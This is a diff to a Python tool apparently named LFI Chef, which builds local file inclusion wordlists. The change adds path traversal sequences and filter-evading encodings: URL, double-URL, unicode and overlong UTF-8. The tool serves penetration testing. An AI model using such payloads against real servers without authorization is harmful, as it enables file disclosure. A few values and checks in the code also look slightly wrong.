@@ -2,9 +2,49 @@
 import argparse
 import hashlib
 import logging
+import os
 import re
 import sys
 from pathlib import Path
+
+
+def windows_sanitize(config_obj: object, line_buffer: str):
+    """
+    Sanitizes the current payload in the line buffer to Windows path specifications.
+
+    :param config_obj:  The program configuration instance.
+    :param line_buffer:  The buffer holding the payload to be sanitized.
+    :return:  The sanitized windows path payload.
+    """
+    # Lower case all characters (Windows case-insensitive) #
+    line_buffer = line_buffer.lower()
+
+    # If the path slashes are using Linux format #
+    if '/' in line_buffer:
+        # Replace the slashes with proper Windows format #
+        line_buffer = line_buffer.replace('/', '\\')
+
+    # If a drive was specified #
+    if config_obj.drive_letter:
+        # If a drive already exists #
+        if re.search(config_obj.drive_match, line_buffer):
+            # If the current drive letter differs from the one passed in #
+            if not line_buffer[:1] == config_obj.drive_letter:
+                # Reformat the new drive letter on the beginning of path #
+                line_buffer = f'{config_obj.drive_letter}:{line_buffer[2:]}'
+        # If no drive exists #
+        else:
+            # Parse the drive letter into the beginning of the path #
+            line_buffer = f'{config_obj.drive_letter}:{line_buffer}'
+
+    # If no drive letter was specified #
+    else:
+        # If a drive letter exists #
+        if re.search(config_obj.drive_match, line_buffer):
+            # Remove it from the beginning of the path #
+            line_buffer = line_buffer[2:]
+
+    return line_buffer
 
 
 def sanitize(config_obj: object):
@@ -32,34 +72,8 @@ def sanitize(config_obj: object):
 
                 # If the wordlist OS is Windows #
                 if config_obj.os == 'windows':
-                    # Lower case all characters (Windows case-insensitive) #
-                    line_buffer = line_buffer.lower()
-
-                    # If the path slashes are using Linux format #
-                    if '/' in line_buffer:
-                        # Replace the slashes with proper Windows format #
-                        line_buffer = line_buffer.replace('/', '\\')
-
-                    # If a drive was specified #
-                    if config_obj.drive_letter:
-                        # If a drive already exists #
-                        if re.search(config_obj.drive_match, line_buffer):
-                            # If the current drive letter differs from the one passed in #
-                            if not line_buffer[:1] == config_obj.drive_letter:
-                                # Reformat the new drive letter on the beginning of path #
-                                line_buffer = f'{config_obj.drive_letter}:{line_buffer[3:]}'
-                        # If no drive exists #
-                        else:
-                            # Parse the drive letter into the beginning of the path #
-                            line_buffer = f'{config_obj.drive_letter}:{line_buffer}'
-
-                    # If no drive letter was specified #
-                    else:
-                        # If a drive letter exists #
-                        if re.search(config_obj.drive_match, line_buffer):
-                            # Remove it from the beginning of the path #
-                            line_buffer = line_buffer[3:]
-
+                    # Run the line buffer through the windows sanitization process #
+                    line_buffer = windows_sanitize(config_obj, line_buffer)
                 # If the wordlist OS is Linux #
                 else:
                     # If the path slashes are using Windows format #
@@ -114,29 +128,6 @@ def null_gen(payload_list: list) -> list:
     return payload_list + mutations
 
 
-def traversal_gen(config_obj: object, payload_list: list) -> list:
-    """
-    Generates path traversal mutations of the original payload passed and populates generated
-    payloads to the payload list.
-
-    :param config_obj:  The program configuration instance.
-    :param payload_list:  The payload list for storing mutations per iteration via wordlist.
-    :return:  The updated mutation payload list.
-    """
-    mutations = []
-
-    # Iterate through the list of path traversal mutations #
-    for traversal in config_obj.traversals:
-        # Iterate through the list of already existing payloads #
-        for payload in payload_list:
-            # Prepend the traversal to the payload as a buffer #
-            payload_buffer = traversal + payload
-            # Append generated payload to mutations list #
-            mutations.append(payload_buffer)
-
-    return payload_list + mutations
-
-
 def encoded_gen(config_obj: object, line_buffer: str, line: str, payload_list: list) -> list:
     """
     Generates encoded payload mutations of the original payload passed and populates generated
@@ -183,6 +174,42 @@ def encoded_gen(config_obj: object, line_buffer: str, line: str, payload_list: l
     return payload_list
 
 
+def traversal_gen(config_obj: object, payload_list: list) -> list:
+    """
+    Generates path traversal mutations of the original payload passed and populates generated
+    payloads to the payload list.
+
+    :param config_obj:  The program configuration instance.
+    :param payload_list:  The payload list for storing mutations per iteration via wordlist.
+    :return:  The updated mutation payload list.
+    """
+    mutations = []
+
+    # Iterate through the specified path traversal range #
+    for traversal in range(config_obj.traversal_start, config_obj.traversal_end + 1):
+        # Iterate through the list of already existing payloads #
+        for payload in payload_list:
+            # Iterate through the list of traversal characters #
+            for traversal_set in config_obj.traversal_chars:
+                # Unpack the current iteration traversal set #
+                path_parse, slash_parse = traversal_set.split(':')
+                # If the OS is Windows #
+                if os.name == 'nt':
+                    # Replace the backslash characters in path with slash parse #
+                    payload_buffer = payload.replace('\\', slash_parse)
+                # If the OS is Linux or Mac #
+                else:
+                    # Replace the slash characters in path with slash parse #
+                    payload_buffer = payload.replace('/', slash_parse)
+
+                # Prepend the traversal to the payload as a buffer #
+                payload_buffer = (path_parse * traversal) + payload_buffer
+                # Append generated payload to mutations list #
+                mutations.append(payload_buffer)
+
+    return payload_list + mutations
+
+
 def generate(config_obj: object):
     """
     Takes the input file and re-replicates each line with copies with path different path encodings
@@ -204,15 +231,15 @@ def generate(config_obj: object):
                 # Add original file path payload to list #
                 payload_list.append(line_buffer)
 
-                # If there are encoding mutations to generate #
-                if config_obj.path_chars:
-                    # Generate specified encoded mutations #
-                    payload_list = encoded_gen(config_obj, line_buffer, line, payload_list)
-
                 # If there are directory traversal mutations to generate #
                 if config_obj.traversals:
                     # Generate path traversal mutations #
                     payload_list = traversal_gen(config_obj, payload_list)
+
+                # If there are encoding mutations to generate #
+                if config_obj.path_chars:
+                    # Generate specified encoded mutations #
+                    payload_list = encoded_gen(config_obj, line_buffer, line, payload_list)
 
                 # If there are null byte mutations to generate #
                 if config_obj.null_byte:
@@ -274,7 +301,8 @@ class ProgramConfig:
         self.period_chars = []
         self.colon_chars = []
         self.traversal_chars = []
-        self.traversals = []
+        self.traversal_start = None
+        self.traversal_end = None
         self.null_byte = False
         self.drive_letter = None
         self.drive_match = re.compile('^[A-Za-z]:', re.M)
@@ -308,6 +336,63 @@ class ProgramConfig:
 
         return file_path
 
+    def validate_traversal(self, parsed_input: str):
+        """
+        Validates the input number of specified path traversal recursions. Then generates the
+        range of specified path traversal payload mutations.
+
+        :param parsed_input:  The parsed input arg for number of traversals to generate.
+        :return:  Nothing
+        """
+        # If a specified range was passed in #
+        if ':' in parsed_input:
+            # Split range by colon delimiter #
+            start, end = parsed_input.split(':')
+            # Attempt to convert the split range numbers #
+            start_int = self.int_convert(start)
+            end_int = self.int_convert(end)
+        # If a single number range was passed in #
+        else:
+            start_int = 1
+            # Attempt to convert string integer to integer #
+            end_int = self.int_convert(parsed_input)
+
+        # If one of the integers in traversal range is missing #
+        if not start_int or not end_int:
+            # Print error and exit #
+            print_err('Improper traversal input type, should be number:number '
+                      f'but input \"{start_int}:{end_int}\" detected')
+            sys.exit(2)
+
+        # If start or end range number are below their minimum or start is greater than the end #
+        if start_int < 1 or end_int < 2 or start_int > end_int:
+            # Print error and exit #
+            print_err('Improper traversal input value, either below minimum threshold or range '
+                      f'start is greater than its end but input \"{start_int}:{end_int}\" detected')
+            exit(2)
+
+        self.traversal_start = start_int
+        self.traversal_end = end_int
+
+    @staticmethod
+    def int_convert(str_int: str):
+        """
+        Converts string integer back to its native integer format
+
+        :param str_int:  The string integer to be converter back to integer.
+        :return:  Converted integer on success, None on failure.
+        """
+        try:
+            # Convert string integer to raw integer #
+            int_res = int(str_int)
+
+        # If error occurs converting integer to string #
+        except ValueError as conversion_err:
+            print_err(f'Error occurred converting string integer to integer: {conversion_err}')
+            int_res = None
+
+        return int_res
+
     def parse_encoding(self, encoding_input: str):
         """
         Takes the input encoding string in any order. Iterates through char by char checking for
@@ -337,145 +422,57 @@ class ProgramConfig:
             if char == 'o':
                 overlong_encoding = True
 
-        # TODO: add various researched path encodings
-
         # If url encoding was specified #
         if url:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars.append('%5c')
+                self.colon_chars.append('%3a')
             # If the specified os is linux/mac #
             else:
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars.append('%2f')
+                self.colon_chars.append(None)
 
-            self.period_chars += []
+            self.period_chars.append('%2e')
 
         # If double url encoding was specified #
         if double_url:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars.append('%255c')
+                self.colon_chars.append('%253a')
             # If the specified os if linux/mac #
             else:
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars.append('%252f')
+                self.colon_chars.append(None)
 
-            self.period_chars += []
+            self.period_chars.append('%252e')
 
         # If 16-bit unicode was specified #
         if bit_unicode:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars += ['%u005c', '%u2216']
+                self.colon_chars += ['%u003a', '%u003a']
             # If the specified os if linux/mac #
             else:
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars += ['%u002f', '%u2215']
+                self.colon_chars += [None, None]
 
-            self.period_chars += []
+            self.period_chars += ['%u002e', '%u002e']
 
         # If overlong utf-8 encoding was specified #
         if overlong_encoding:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars += ['%c0%5c', '%c0%80%5c', '%c0%5c']
+                self.colon_chars += ['%c0%3a', '%e0%80%3a', '%c0%3a']
             # If the specified os if linux/mac #
             else:
-                self.path_chars += []
-                self.colon_chars += []
+                self.path_chars += ['%c0%af', '%e0%80%af', '%c0%2f']
+                self.colon_chars += [None, None, None]
 
-            self.period_chars += []
-
-    def validate_traversal(self, parsed_input: str):
-        """
-        Validates the input number of specified path traversal recursions. Then generates the
-        range of specified path traversal payload mutations.
-
-        :param parsed_input:  The parsed input arg for number of traversals to generate.
-        :return:  Nothing
-        """
-        # If a specified range was passed in #
-        if ':' in parsed_input:
-            # Split range by colon delimiter #
-            start, end = parsed_input.split(':')
-            # Attempt to convert the split range numbers #
-            start_int = self.int_convert(start)
-            end_int = self.int_convert(end)
-
-            # If the start or end number failed to convert #
-            if not start_int or not end_int or start_int > end_int:
-                # Print error and exit #
-                print_err('Improper traversal range format detected .. '
-                          'proper format is <start_number>:<end_number>')
-                sys.exit(2)
-
-            # Iterate through range and generate traversals #
-            for num_traverse in range(start_int, end_int + 1):
-                # Generate a list of traversal mutations based on current iteration multiplier #
-                current_payloads = self.traversal_payload_gen(num_traverse)
-                # Add the resulting list of payloads to traversals list #
-                self.traversals += current_payloads
-
-        # If a single number range was passed in #
-        else:
-            # Attempt to convert string integer to integer #
-            int_input = self.int_convert(parsed_input)
-            # If the string integer conversion failed to convert #
-            if not int_input:
-                # Print error and exit #
-                print_err('Input number specified for traversal mutations failed to '
-                          f'convert: {parsed_input}')
-                sys.exit(2)
-
-            # If the parsed integer input is not greater than 0 #
-            if not int_input > 0:
-                # Print error and exit #
-                print_err(f'The input integer {parsed_input} should be a positive integer '
-                          'greater than zero')
-                sys.exit(2)
-
-            # Iterate through range and generate traversals #
-            for num_traverse in range(int_input + 1):
-                # Generate a list of traversal mutations based on current iteration multiplier #
-                current_payloads = self.traversal_payload_gen(num_traverse)
-                # Add the resulting list of payloads to traversals list #
-                self.traversals += current_payloads
-
-    @staticmethod
-    def int_convert(str_int: str):
-        """
-        Converts string integer back to its native integer format
-
-        :param str_int:  The string integer to be converter back to integer.
-        :return:  Converted integer on success, None on failure.
-        """
-        try:
-            # Convert string integer to raw integer #
-            int_res = int(str_int)
-
-        # If error occurs converting integer to string #
-        except ValueError as conversion_err:
-            print_err(f'Error occurred converting string integer to integer: {conversion_err}')
-            int_res = None
-
-        return int_res
-
-    def traversal_payload_gen(self, traversal_mul: int) -> list:
-        """
-        Takes the passed in traversal multiplier and generates the current recursion number with
-        each mutation in the traversal chars list.
-
-        :param traversal_mul:  The number of times to mutate the traversal character mutation.
-        :return:  The list of generated mutations for the current traversal multiplier.
-        """
-        traversals = []
-        # Iterate through the traversal chars and add the current mutations multiplier to list #
-        return [traversals.append(char * traversal_mul) for char in self.traversal_chars]
+            self.period_chars += ['%c0%2e', '%e0%40%ae', '%c0%ae']
 
     def validate_drive(self, drive_letter: str):
         """
@@ -501,7 +498,8 @@ if __name__ == '__main__':
 
     # Parse command line arguments #
     arg_parser = argparse.ArgumentParser(description='LFI Chef is a tool that helps automate the '
-                                                     'process of LFI wordlist generation')
+                                                     'process of LFI wordlist generation with '
+                                                     'integrated evasion techniques')
     arg_parser.add_argument('in_file', help='The path to input file or name of file'
                                             ' if in same directory')
     arg_parser.add_argument('mode', choices=['generate', 'sanitize'],
@@ -516,8 +514,9 @@ if __name__ == '__main__':
                                                 'directory traversal payloads or specify specific'
                                                 'ranges like 2:4 generating recursions 2-4')
     arg_parser.add_argument('--traversal_chars', help='Specify the custom traversal payload chars'
-                                                      'in a comma-separated list like ../,..%2f,'
-                                                      '....//,....%2f%2f')
+                                                      'in a comma-separated with a colon delimiter '
+                                                      'between traversal and slash format list like'
+                                                      ' ../:/, ....//://, ..\\:\\, etc')
     arg_parser.add_argument('--null_byte', default=False, type=bool,
                             help='Boolean toggle to generate null byte payloads based on generated '
                                  'encoding & traversal mutations')
@@ -532,7 +531,7 @@ if __name__ == '__main__':
 
     # Initialize program configuration class #
     conf_obj = ProgramConfig()
-    # Validate required program args #
+    # Validate program input wordlist #
     conf_obj.in_file = conf_obj.validate_file(parsed_args.in_file, is_required=True)
     # Set program mode in config class #
     conf_obj.mode = parsed_args.mode
@@ -550,15 +549,17 @@ if __name__ == '__main__':
         if parsed_args.traversal_chars:
             # Split comma-separated values into list #
             conf_obj.traversal_chars = parsed_args.traversal_chars.split(',')
+            # Filter out any items that do have proper colon delimiter #
+            conf_obj.traversal_chars = [item for item in conf_obj.traversal_chars if ':' in item]
         # If no traversal char set was specified resulting in default char set #
         else:
             # TODO: add more default path traversal mutations
             # If the target OS is Windows #
             if conf_obj.mode == 'windows':
-                conf_obj.traversal_chars = ['..\\', '....\\\\']
+                conf_obj.traversal_chars = ['..\\:\\', '....\\\\:\\\\']
             # If the target OS is Linux #
             else:
-                conf_obj.traversal_chars = ['../', '..//']
+                conf_obj.traversal_chars = ['../:/', '....//://']
 
         # Validate the directory traversal integer #
         conf_obj.validate_traversal(parsed_args.traversal)
